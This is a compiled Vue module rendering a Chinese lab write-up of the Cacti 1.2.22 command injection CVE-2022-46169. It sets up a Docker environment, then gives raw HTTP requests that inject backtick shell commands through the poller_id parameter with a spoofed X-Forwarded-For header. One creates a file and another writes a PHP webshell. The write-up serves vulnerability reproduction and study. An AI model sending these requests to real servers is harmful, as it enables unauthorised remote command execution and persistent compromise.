import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as c,o as l,c as o,a as e,b as i,d as t,e as r}from"./app-58e4a7d6.js";const s={},d=e("p",null,"Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。",-1),p=e("p",null,"参考链接：",-1),g={href:"https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf",target:"_blank",rel:"noopener noreferrer"},m={href:"https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A",target:"_blank",rel:"noopener noreferrer"},u=r(`<h2 id="漏洞环境" tabindex="-1"><a class="header-anchor" href="#漏洞环境" aria-hidden="true">#</a> 漏洞环境</h2><p>Vulhub执行如下命令启动一个Cacti 1.2.22版本服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>会跳转到登录页面。使用admin/admin作为账号密码登录，并根据页面中的提示进行初始化。</p><p>实际上初始化的过程就是不断点击“下一步”，直到安装成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20221228090322979-167884614486415.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这个漏洞的利用需要Cacti应用中至少存在一个类似是<code>POLLER_ACTION_SCRIPT_PHP</code>的采集器。所以，我们在Cacti后台首页创建一个新的Graph：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20221228090831131-167884614658917.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>选择的Graph Type是“Device - Uptime”，点击创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20221228091535103-167884614839619.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h2><p>完成上述初始化后，我们切换到攻击者的角色。作为攻击者，发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=\`touch+/tmp/success\` HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost.lan
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20221228092519319-167884615245021.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>虽然响应包里没有回显，但是进入容器中即可发现<code>/tmp/success</code>已成功被创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20221228093004203-167884615428523.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>写入webshell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=\`echo+&#39;&lt;?php+phpinfo();?&gt;&#39;&gt;/var/www/html/test.php\` HTTP/1.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,18);function h(_,b){const a=c("ExternalLinkIcon");return l(),o("div",null,[d,p,e("ul",null,[e("li",null,[e("a",g,[i("https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf"),t(a)])]),e("li",null,[e("a",m,[i("https://mp.weixin.qq.com/s/6crwl8ggMkiHdeTtTApv3A"),t(a)])])]),u])}const x=n(s,[["render",h],["__file","Cacti 前台命令注入漏洞 CVE-2022-46169.html.vue"]]);export{x as default};
